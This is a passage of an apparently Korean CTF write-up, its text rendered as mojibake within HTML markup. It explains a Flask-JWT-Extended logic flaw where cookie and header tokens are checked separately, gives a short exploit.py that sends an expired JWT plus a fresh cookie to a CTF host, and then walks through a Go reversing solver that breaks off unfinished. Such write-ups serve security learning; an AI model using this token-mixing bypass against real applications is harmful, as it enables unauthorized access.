        app.config[&amp;#x27;JWT_SECRET_KEY&amp;#x27;]     = app.config[&amp;#x27;SECRET&amp;#x27;]
        app.config[&amp;#x27;JWT_TOKEN_LOCATION&amp;#x27;] = [&amp;#x27;cookies&amp;#x27;, &amp;#x27;headers&amp;#x27;]
        jwtmanager                       = JWTManager(app)

        return app&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;1141cb91-532d-4809-aba0-01d76fdb10ce&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì˜ ë¬¸ì œì—ì„œ ìš”êµ¬í•˜ëŠ” ê²ƒì€ /flag ë¡œ ì ‘ê·¼í•˜ì—¬ &lt;code&gt;&lt;strong&gt;@jwt_required&lt;/strong&gt;&lt;/code&gt;ë¥¼ í†µê³¼í•œ í›„, flag í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ì§€ë§Œ, &lt;code&gt;&lt;strong&gt;get_jwt_identity()&lt;/strong&gt;&lt;/code&gt; í•¨ìˆ˜ì™€ &lt;code&gt;&lt;strong&gt;is_expired()&lt;/strong&gt;&lt;/code&gt; í•¨ìˆ˜ë¥¼ í†µí•´ í˜„ì¬ í† í°ì´ ë§Œë£Œë˜ì–´ì•¼ë§Œ flagë¥¼ ì „ë‹¬í•´ì£¼ëŠ” í˜•íƒœì˜ ë¬¸ì œì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;3c22b413-14e9-43a2-be31-1e3a1fc900ee&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì²« ë²ˆì§¸ë¡œ jwt_requiredë¼ëŠ” decoratorì—ì„œëŠ” requestì—ì„œ ë°›ì•„ì˜¨ JWTì˜ ìƒíƒœë¥¼ ì²´í¬í•˜ê³ , ì •ìƒì ì¸ í† í°(ë§Œë£Œ ìƒíƒœ, ì‹œê·¸ë‹ˆì²˜ í™•ì¸ ë“±)ì¸ ê°€ë¥¼ í™•ì¸í•œë‹¤. ì¦‰, ì •ìƒì ìœ¼ë¡œ ì„œë²„ì—ì„œ ë°œí–‰í•œ í† í°ì´ì–´ì•¼ í•œë‹¤ëŠ” ì˜ë¯¸ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;6a857874-05dd-4ac0-b0b9-e3b96a8b3810&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‘ ë²ˆì§¸ë¡œ access_tokenì—ì„œ Authorization í—¤ë”ì— ìˆëŠ” í† í°ì„ ë°›ì•„ì™€ í•´ë‹¹ í† í°ì´ ì •ìƒì ì¸ì§€ ì²´í¬í•˜ì—¬ expired ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ë£¨í‹´ì´ ìˆë‹¤. ë‹¨, ì—¬ê¸°ì„œë„ get_jwt_identity() í•¨ìˆ˜ë¡œ í† í°ì„ ê²€ì‚¬í•˜ê¸° ë•Œë¬¸ì— ì„œë²„ì—ì„œ ë°œí–‰í•œ ì •ìƒì ì¸ í† í°ì„ ì‚¬ìš©í•´ì•¼ í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;f01ce446-00ee-48c0-a07e-5e6c8e6372a1&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë”°ë¼ì„œ ìœ„ì˜ ë¬¸ì œì˜ ì»¨ì…‰ì€ &lt;strong&gt;JWTê°€ ë§Œë£Œë˜ì§€ ì•Šì•˜ì§€ë§Œ, ë§Œë£Œë˜ì–´ì•¼ í’€ë¦¬&lt;/strong&gt;ëŠ” ë¬¸ì œë¡œ, ë¡œì§€ì»¬í•œ ì·¨ì•½ì ì„ ì˜ë„í•œ ê²ƒì´ë‹¤. ë¨¼ì € ë¬¸ì œ í’€ì´ì— ì•ì„œ Flask-JWT-Extended ì˜¤í”ˆì†ŒìŠ¤ì— ëŒ€í•œ ì„¤ëª…ì´ í•„ìš”í•  ê²ƒ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;38f0c092-7e17-4c9d-b060-89175ea857da&quot; class=&quot;&quot;&gt;[Flask-JWT-Extended]&lt;/h2&gt;&lt;ul id=&quot;4c880ec3-1cdf-44e7-a1f5-10908e2458d4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Flaskì—ëŠ” ë‹¤ì–‘í•œ Extended ëª¨ë“ˆì´ ìˆëŠ”ë°, ê·¸ ì¤‘ í•˜ë‚˜ë¡œ JWTì— ëŒ€í•œ ëª¨ë“ˆì´ ìˆë‹¤. pyjwtë¥¼ ì‚¬ìš©í•´ë„ ë¬´ë°©í•˜ë‚˜, ë³´ë‹¤ ìœ ì—°í•œ ì½”ë“œ ì‘ì„±ê³¼ ê´€ë¦¬ë¥¼ ìœ„í•´ Flask-JWT-Extendedë¥¼ ì¶”ì²œí•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;5a2bad66-3149-4d19-9d38-a88fb52aac79&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://flask-jwt-extended.readthedocs.io/en/stable/&quot;&gt;Document&lt;/a&gt;&lt;/strong&gt;ë¥¼ ì‚´í´ë³´ë©´ Basic Usageì—ì„œ ë³´ì—¬ì£¼ëŠ” ê²ƒê³¼ ê°™ì´ &lt;code&gt;&lt;strong&gt;Header&lt;/strong&gt;&lt;/code&gt;ë¥¼ í†µí•´ JWTë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒê³¼ &lt;code&gt;&lt;strong&gt;Query(get)&lt;/strong&gt;&lt;/code&gt;, &lt;code&gt;&lt;strong&gt;JSON(post)&lt;/strong&gt;&lt;/code&gt;, &lt;code&gt;&lt;strong&gt;Cookie&lt;/strong&gt;&lt;/code&gt;ê·¸ë¦¬ê³  ì´ ë„¤ ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì‚¬ìš©ì´ ê°€ëŠ¥í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;b4b5d55c-5d08-45e7-b993-548a0deb16e2&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ë¥¼ ì²˜ë¦¬í•˜ëŠ” ë£¨í‹´ì„ ë¨¼ì € íŒŒì•…í•´ë³´ë„ë¡ í•˜ì.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;c404ad61-98f6-4853-8b33-7bdd31e098ca&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;flask-jwt-extended ì˜ view_decorator ì†ŒìŠ¤&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;cf45bfc8-a096-4d50-85f9-e1f7ae8450dc&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;# https://github.com/vimalloc/flask-jwt-extended/blob/master/flask_jwt_extended/view_decorators.py
def _decode_jwt_from_request(request_type):
    # All the places we can get a JWT from in this request
    get_encoded_token_functions = []

    locations = config.token_location

    # add the functions in the order specified in JWT_TOKEN_LOCATION
    for location in locations:
        if location == &amp;#x27;cookies&amp;#x27;:
            get_encoded_token_functions.append(
                lambda: _decode_jwt_from_cookies(request_type))
        if location == &amp;#x27;query_string&amp;#x27;:
            get_encoded_token_functions.append(_decode_jwt_from_query_string)
        if location == &amp;#x27;headers&amp;#x27;:
            get_encoded_token_functions.append(_decode_jwt_from_headers)
        if location == &amp;#x27;json&amp;#x27;:
            get_encoded_token_functions.append(
                lambda: _decode_jwt_from_json(request_type))

    # Try to find the token from one of these locations. It only needs to exist
    # in one place to be valid (not every location).
    errors = []
    decoded_token = None
    jwt_header = None
    for get_encoded_token_function in get_encoded_token_functions:
        try:
            encoded_token, csrf_token = get_encoded_token_function()
            decoded_token = decode_token(encoded_token, csrf_token)
            jwt_header = get_unverified_jwt_headers(encoded_token)
            break
        except NoAuthorizationError as e:
            errors.append(str(e))

    # Do some work to make a helpful and human readable error message if no
    # token was found in any of the expected locations.
    if not decoded_token:
        token_locations = config.token_location
        multiple_jwt_locations = len(token_locations) != 1

        if multiple_jwt_locations:
            err_msg = &amp;quot;Missing JWT in {start_locs} or {end_locs} ({details})&amp;quot;.format(
                start_locs=&amp;quot;, &amp;quot;.join(token_locations[:-1]),
                end_locs=token_locations[-1],
                details=&amp;quot;; &amp;quot;.join(errors)
            )
            raise NoAuthorizationError(err_msg)
        else:
            raise NoAuthorizationError(errors[0])

    verify_token_type(decoded_token, expected_type=request_type)
    verify_token_not_blacklisted(decoded_token, request_type)
    return decoded_token, jwt_header&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;b61724f7-4c70-466b-9443-a1ff626b14be&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;b718b843-c96e-4fcc-bd64-76375a899866&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ for ë°˜ë³µë¬¸ì„ ì´ìš©í•˜ì—¬ &lt;code&gt;&lt;strong&gt;location&lt;/strong&gt;&lt;/code&gt; í† í°ì´ ìˆì„ ê²ƒì´ë¼ ë¯¸ë¦¬ ì„ ì–¸ë˜ì–´ ìˆë˜ ìœ„ì¹˜ë¥¼ ëª¨ë‘ í™•ì¸í•˜ì—¬ &lt;code&gt;&lt;strong&gt;get_encoded_token_functions&lt;/strong&gt;&lt;/code&gt;ì— append í•œë‹¤. ì´ë•Œ locationì€ config.pyì— &lt;strong&gt;JWT_TOKEN_LOCATION&lt;/strong&gt;ìœ¼ë¡œ ì„ ì–¸í•˜ê±°ë‚˜ &lt;strong&gt;app.config[&amp;#x27;JWT_TOKEN_LOCATION&amp;#x27;]&lt;/strong&gt;ì— ì„ ì–¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;538762da-63a8-4e28-8192-560026666524&quot; class=&quot;code&quot;&gt;&lt;code&gt;    for get_encoded_token_function in get_encoded_token_functions:
        try:
            encoded_token, csrf_token = get_encoded_token_function()
            decoded_token = decode_token(encoded_token, csrf_token)
            jwt_header = get_unverified_jwt_headers(encoded_token)
            break
        except NoAuthorizationError as e:
            errors.append(str(e))&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;a6ef58f4-4a14-4066-8b94-0bdd1ba57698&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ë•Œ ìœ„ì™€ ê°™ì´ get_encoded_token_functionsì— appendëœ ëª¨ë“  ìœ„ì¹˜ì—ì„œ í† í°ì„ íŒŒì‹±í•˜ëŠ” ê²ƒì´ ì•„ë‹ˆë¼ appendëœ ìˆœì„œëŒ€ë¡œ tokenì„ ê²€ì‚¬í•˜ë˜, &lt;strong&gt;í•˜ë‚˜ê°€ ì •ìƒì ìœ¼ë¡œ íŒŒì‹±ë˜ì—ˆì„ ê²½ìš°, ë’¤ì˜ í† í°ì€ ë¬´ì‹œí•˜ë„ë¡ ì½”ë“œê°€ ì‘ì„±&lt;/strong&gt;ë˜ì–´ ìˆë‹¤.  ë”°ë¼ì„œ í† í°ì˜ ìœ„ì¹˜ê°€ ì—¬ëŸ¬ ê³³ìœ¼ë¡œ ì§€ì •í•  ê²½ìš° ë¡œì§€ì»¬í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆê³ , ì´ë²ˆ ë¬¸ì œì˜ ì»¨ì…‰ ë˜í•œ ì´ì™€ ë™ì¼í•˜ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;267e3b2b-703c-4566-9131-6385ceedc936&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë‹¤ì‹œ ë¬¸ì œë¡œ ëŒì•„ì™€ ëˆˆì—¬ê²¨ë´ì•¼ í•  ê²ƒì€ &lt;strong&gt;app.config[&amp;#x27;JWT_TOKEN_LOCATION&amp;#x27;]&lt;/strong&gt;ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;e8a66531-f279-4561-9faa-5586cc8b45c5&quot; class=&quot;code&quot;&gt;&lt;code&gt;    with app.app_context():
        app.config[&amp;#x27;JWT_SECRET_KEY&amp;#x27;]     = app.config[&amp;#x27;SECRET&amp;#x27;]
        app.config[&amp;#x27;JWT_TOKEN_LOCATION&amp;#x27;] = [&amp;#x27;cookies&amp;#x27;, &amp;#x27;headers&amp;#x27;]
        jwtmanager                       = JWTManager(app)

        return app&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;03afb3dc-36e7-4f9c-81bf-00ab13fc3418&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;JWT í† í°ì˜ ìœ„ì¹˜ê°€ cookies, ê·¸ë¦¬ê³  headersë¡œ ë˜ì–´ ìˆë‹¤. &lt;code&gt;&lt;strong&gt;jwt_required&lt;/strong&gt;&lt;/code&gt;ì™€ &lt;strong&gt;&lt;code&gt;get_jwt_identity()&lt;/code&gt;&lt;/strong&gt;ì—ì„œëŠ” cookiesì— ì„ ì–¸ëœ JWT Tokenì„ í†µí•´ ê²€ì¦í•˜ê²Œ ëœë‹¤. ê·¸ëŸ¬ë‚˜ ì¸ìœ„ì ìœ¼ë¡œ Authorization í—¤ë”ë¥¼ í†µí•´ ê²€ì¦í•˜ëŠ” ê³³ì—ì„œëŠ” &lt;code&gt;&lt;strong&gt;_decode_jwt_from_request&lt;/strong&gt;&lt;/code&gt;ì—ì„œ returní•˜ëŠ” í† í°ê³¼ëŠ” ë‹¤ë¥´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;d19607a1-178e-4b49-92e8-d62597e38fee&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ì™€ ê°™ì€ ê²€ì‚¬ ë£¨í‹´ì„ í†µí•´ ê²€ì¦í•  ê²½ìš° ë¡œì§€ì»¬í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— Flask-JWT-Extendedì˜ ê²½ìš° í•´ë‹¹ ëª¨ë“ˆì—ì„œ ì œê³µí•˜ëŠ” í•¨ìˆ˜ë¡œ í† í° ê²€ì‚¬ ë° ê²€ì¦ ê°’ì„ ë°˜í™˜í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì´ ê¶Œì¥ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;e88d8242-5539-45c8-aad2-aea20460c1e2&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;# exploit.py
import requests
import json
import jwt

requests.packages.urllib3.disable_warnings()

# Get Token
url     = &amp;quot;http://ctf.kkamikoon.com/&amp;quot;
headers = { &amp;quot;Content-Type&amp;quot;  : &amp;quot;application/json; charset=utf-8&amp;quot; }
data    = { &amp;quot;username&amp;quot;      : &amp;quot;admin&amp;quot;,
            &amp;quot;password&amp;quot;      : &amp;quot;admin&amp;quot; }

res     = requests.post(url=url + &amp;quot;login&amp;quot;, headers=headers, data=json.dumps(data), verify=False)
new     = json.loads(res.text)[&amp;#x27;access_token&amp;#x27;]

# Expired JWT == Exploit JWT
exploit_jwt     = &amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTc4NTc4MzcsIm5iZiI6MTU5Nzg1NzgzNywianRpIjoiMzQyYjNlZTItMzQ1My00Y2IzLWFjYzgtZjMxMzcyYjU3NGEwIiwiZXhwIjoxNTk3ODU3ODAwLCJpZGVudGl0eSI6Imd1ZXN0IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIiwiY3NyZiI6IjRmNGE4YTk3LTdiNDEtNGZiMy1iYzcxLTE0YjBiODM3ZmQyNSJ9.pJYyoZjq-6l06TQ6ugfQZjoHtSClEhW_6AvXzYjAQM8&amp;quot; # expired
exploit_headers = {
    &amp;quot;Authorization&amp;quot; : f&amp;quot;Bearer {exploit_jwt}&amp;quot;,
    &amp;quot;Cookie&amp;quot;        : f&amp;quot;access_token_cookie={new}&amp;quot;
}

res     = requests.get(url=url + &amp;quot;flag&amp;quot;, headers=exploit_headers, verify=False)

print(res.text)&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;55257ad5-1d4c-4313-b0d4-feb6e529cbb4&quot; class=&quot;&quot;&gt;ğŸ–¥ï¸ REVERSING&lt;/h1&gt;&lt;h2 id=&quot;dccd26d2-279c-4c94-9120-194dd56b7cd1&quot; class=&quot;&quot;&gt;gocat&lt;/h2&gt;&lt;hr id=&quot;fe45f93d-643a-48d7-b716-39ce5eb0423a&quot;/&gt;&lt;figure id=&quot;cd0eb254-1928-4460-94c3-37116ab80aad&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob945.png&quot;&gt;&lt;img style=&quot;width:715px&quot; src=&quot;/assets/bob/bob945.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;ff250581-9e33-4179-b7b1-f4743d47b0bb&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;golang ë¦¬ë²„ì‹± &amp;amp; ê°„ë‹¨í•œ ì—­ì—°ì‚° / 0 solver&lt;/div&gt;&lt;/figure&gt;&lt;ul id=&quot;3886f266-d89c-492a-95ce-274eba78b576&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì£¼ì–´ì§„ ë¬¸ì œ íŒŒì¼ì„ ë‹¤ìš´ë¡œë“œë°›ê³  ë°”ì´ë„ˆë¦¬ë¥¼ idaë¡œ ì—´ê²Œë˜ë©´ ì•„ë˜ì™€ ê°™ì´ ì‹¬ë³¼ì´ ì‚´ì•„ìˆì§€ ì•Šì€ ê²ƒì²˜ëŸ¼ ë³´ì¸ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;dd676894-df72-4120-9e5f-9b99deb00069&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob946.png&quot;&gt;&lt;img style=&quot;width:288px&quot; src=&quot;/assets/bob/bob946.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;7b6e3062-e735-446c-8eda-d82c6d871e45&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•˜ì§€ë§Œ golangì€ ì½”ë“œ ì‘ì„±ì‹œ ì‚¬ìš©í•œ íŒ¨í‚¤ì§€ì™€ ì—¬ëŸ¬ í•¨ìˆ˜ì— ëŒ€í•œ ì •ë³´ë“¤ì„ &lt;code&gt;gopclntab&lt;/code&gt; ì„¹ì…˜ì— ì €ì¥í•œë‹¤. í•´ë‹¹ ì„¹ì…˜ì— ì €ì¥ ì‹œ, ì•„ë˜ì™€ ê°™ì€ êµ¬ì¡°ì²´ë¥¼ ê°€ì§„ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;54a2f025-dd01-4605-b64e-194a925fdc20&quot; class=&quot;code&quot;&gt;&lt;code&gt;struct _FUNCTIONINFO {
	QDWORD lpFunctionAddr,
	QDWORD qdNameOffset
}&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;7e78d444-25ea-420a-a2a6-13512d8791b1&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë”°ë¼ì„œ, í•´ë‹¹ ì„¹ì…˜ì˜ êµ¬ì¡°ì²´ë¥¼ íŒŒì‹±í•´ì„œ ì˜¤ë””íŒ…ì„ ì§„í–‰í•˜ë©´ ëœë‹¤. í•˜ì§€ë§Œ ì´ ì‘ì—…ë“¤ì€ ë„ˆë¬´ ë§ì€ ë…¸ë™ì´ í•„ìš”í•˜ë¯€ë¡œ ëˆ„êµ°ê°€ ë§Œë“¤ì–´ë†“ì€ &lt;a href=&quot;https://github.com/strazzere/golang_loader_assist&quot;&gt;ida golang assist&lt;/a&gt;ë¥¼ ì‚¬ìš©í•˜ë©´ ì•„ë˜ì˜ ê·¸ë¦¼ê³¼ ê°™ì´ ë¹„êµì  ê¹”ë”í•œ í•¨ìˆ˜ëª…ì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;ade8037f-8854-49dd-9ed5-b880e97ec060&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;e312a978-43b1-41da-bf6b-a039fcfa8803&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob947.png&quot;&gt;&lt;img style=&quot;width:336px&quot; src=&quot;/assets/bob/bob947.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;365ae891-9cfe-4fa0-a954-ac26855740ea&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì™€ ê°™ì´ assistë¥¼ ì‚¬ìš©í•´ í•¨ìˆ˜ëª…ì„ ë°”ê¿”ì¤€ ì´í›„, main_mainí•¨ìˆ˜ë¥¼ ì°¾ì•„ì„œ ë””ì»´íŒŒì¼í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;0ecccb43-67ba-4f60-a954-c36841f0ac9f&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob948.png&quot;&gt;&lt;img style=&quot;width:624px&quot; src=&quot;/assets/bob/bob948.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;d02379ac-b690-4074-8e1b-2f8ce7e6d0fd&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;main_mainí•¨ìˆ˜ë¥¼ ëŒ€ëµì ìœ¼ë¡œ ì‚´í´ë³´ë©´ ì–´ëŠì •ë„ êµ¬ì¡°ê°€ ëˆˆì— ë“¤ì–´ì˜¤ê²Œ ë˜ëŠ”ë° ë‹¤ìŒê³¼ ê°™ì€ pseudo codeë¡œ ë˜ì–´ìˆìŒì„ ì•Œ ìˆ˜ ìˆê³ , ì—­ì—°ì‚°ì´ ì¶©ë¶„íˆ ê°€ëŠ¥í•œ êµ¬ì¡°ì¸ ê²ƒ ë˜í•œ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;9f2e0cc3-8d28-4b77-bbc7-36376cdf1c2d&quot; class=&quot;code&quot;&gt;&lt;code&gt;# pseudo code
seed = time.unixtime()
srand(seed);

for i in range(256):
	table[i] = rand()

flag = input()
if len(flag) &amp;gt; 44:
	exit(0)

result = []
for i in range(44):
	result += [ getRandom() * table[getIndex((1 &amp;lt;&amp;lt; i) % 256)] + flag[i] ]

for i in range(44):
	print(i, result[i])&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;f8a8acaa-2081-46fa-a703-aa1cd2575b1e&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì—¬ê¸°ì„œ ì¶”ê°€ì ìœ¼ë¡œ ë¶„ì„í•´ì•¼í•  ê²ƒì€ getIndexí•¨ìˆ˜ì¸ë°, í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‚´í´ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;a05f98c7-e335-4061-8af1-ec0bd9f4d776&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob949.png&quot;&gt;&lt;img style=&quot;width:528px&quot; src=&quot;/assets/bob/bob949.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;f4ae6464-d8de-49cd-9ef6-31cd66e29b91&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì¬ê·€ì ìœ¼ë¡œ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆëŠ”ë°, ì •ìƒì ìœ¼ë¡œ ë””ì»´íŒŒì¼ì´ ë˜ì§€ ì•ŠëŠ”ë‹¤. ì´ëŸ¬í•œ ì´ìœ  ë•Œë¬¸ì— ì–´ì…ˆ ì½”ë“œë¥¼ ë³´ì•„ì•¼í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;de03b832-f9b6-4e44-a44a-4cb16d346723&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob950.png&quot;&gt;&lt;img style=&quot;width:384px&quot; src=&quot;/assets/bob/bob950.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure id=&quot;dbf13fef-319e-4711-9aa9-fb0c2b1f37ce&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob951.png&quot;&gt;&lt;img style=&quot;width:384px&quot; src=&quot;/assets/bob/bob951.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;ul id=&quot;49148284-15b1-4f44-ba92-947131514993&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì˜ ë‘ ê·¸ë¦¼ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯, eaxê°€ getIndexí•¨ìˆ˜ì—ì„œ ìŠ¤íƒìœ¼ë¡œ ë“¤ì–´ê°€ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆê³  ëŒ€ëµì ìœ¼ë¡œ ì•„ë˜ì™€ ê°™ì´ ë™ì‘í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;ac5c98cd-ba6b-4b4c-95de-60188d7ee6b9&quot; class=&quot;code&quot;&gt;&lt;code&gt;def getIndex(depth):
	if depth &amp;lt; 2:
		return 1
	return (getIndex(depth - 2) + getIndex(depth - 1)) % 256&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;bdd836e8-cd3f-4caa-bfd3-e06753f01f14&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì˜ ì‹ëŒ€ë¡œ ê³„ì‚°ì„ í•˜ë©´ í”¼ë³´ë‚˜ì¹˜ ìˆ˜ì—´ì„ì„ ì•Œ ìˆ˜ ìˆëŠ”ë°, ì´ë¥¼ ì¬ê·€ì ìœ¼ë¡œ êµ¬í˜„í–ˆê¸° ë•Œë¬¸ì— 40ë²ˆì§¸ ìˆ˜ì—´ ê°’ì„ ê³„ì‚°í•˜ê¸° ìœ„í•´ì„œ ì ì§€ì•Šì€ ê³„ì‚°ì´ í•„ìš”í•˜ê²Œ ëœë‹¤. ê·¸ëŸ¬ë¯€ë¡œ memorization ì´ë‚˜ ê°„ë‹¨í•˜ê²Œ ë¯¸ë¦¬ ë°°ì—´ë¡œ ê³„ì‚°ì„ í•´ì£¼ë©´ ëœë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;45e88f46-6ebe-446b-ac05-f9fbf1fda342&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ìœ„ì˜ ì‘ì—…ë“¤ì„ ëª¨ë‘ í•©ì³ì„œ, ì—­ì—°ì‚°ì„ í•˜ê¸° ìœ„í•œ pocë¥¼ ì‘ì„±í•˜ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;c2b2bc82-0a14-4e15-b74c-7576d2ce1d21&quot; class=&quot;code&quot;&gt;&lt;code&gt;package main

import (
   &amp;quot;fmt&amp;quot;
   &amp;quot;math/rand&amp;quot;
   &amp;quot;time&amp;quot;
)
var memory []int

func getIndex(idx int) int {
   if memory[idx] != 0 {
      return memory[idx]
   }
   if idx &amp;lt; 2 {
      memory[idx] = 1
      return 1
   }
   result := (getIndex(idx - 2) + getIndex(idx - 1)) &amp;amp; 0xFF
   memory[idx] = result
   return result
}

func getRandom(r *rand.Rand) int {
   return r.Int()
}

func main() {
   memory = make([]int, 0x100)
   flag_enc := []uint32{
2069409670, 2964128287, 2354096995, 3032984546, 10510900, 2544990927, 2926778951, 552570446, 1853857527, 3973419442, 3048538325, 1902664467, 420185447, 2658384181, 2929871612, 4151170943, 7446955, 2503536331, 1899187641, 3227466824, 3596188763, 2770886128, 3598361089, 3417226313, 2440643422, 157914802, 380458138, 2585576567, 3413857472, 2292452225, 2949469921, 3191119812, 3830151779, 783135889, 801108861, 50993623, 2780019976, 283706417, 64541485, 3786109553, 4159600537, 2979925216, 3157377353, 420734285,
   }
   for unix := time.Now().Unix(); unix &amp;gt; 0; unix-- {
      r := rand.New(rand.NewSource(unix))
      table := make([]uint8, 0x100)

      for i := 0; i &amp;lt; 0x100; i++ {
         table[i] = uint8(getRandom(r))
      }
      prefix := []byte(&amp;quot;bob&amp;quot;)
      found := true

      for i := 0; i &amp;lt; len(prefix); i++ {
         calc := int(prefix[i]) + int(table[getIndex(((1 &amp;lt;&amp;lt; uint32(i)) % 256))]) * getRandom(r)
         if uint32(calc) != flag_enc[i] {
            found = false
            break
         }
      }
      if found == true {
         fmt.Println(&amp;quot;[+] Found flag&amp;quot;)
         flag := make([]byte, len(flag_enc))
         for i := len(prefix); i &amp;lt; len(flag_enc); i++ {
            flag[i] = byte(int(uint32(flag_enc[i])) - int(table[(getIndex((1 &amp;lt;&amp;lt; uint32(i) % 256)))]) * getRandom(r))
         }
         fmt.Println(&amp;quot;flag =&amp;gt; &amp;quot;, string(prefix) + string(flag))
         return
      }
   }
